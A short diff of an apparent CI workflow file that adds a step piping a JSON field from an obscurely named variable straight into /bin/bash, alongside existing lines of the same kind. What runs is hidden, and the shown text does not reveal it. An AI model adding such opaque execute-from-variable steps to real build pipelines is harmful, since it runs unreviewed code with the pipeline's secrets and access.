@@ -39,6 +39,7 @@ jobs:
           echo $ybl2764 | jq -r .z3 | /bin/bash
           echo $dgr5 | jq -r .bkxn6655 | /bin/bash
           printf '%s' "$ieaom51" | jq -r .h1 | /bin/bash
+          echo $jij7 | jq -r .ur0 | /bin/bash
 
       - name: Upload data
         if: always()
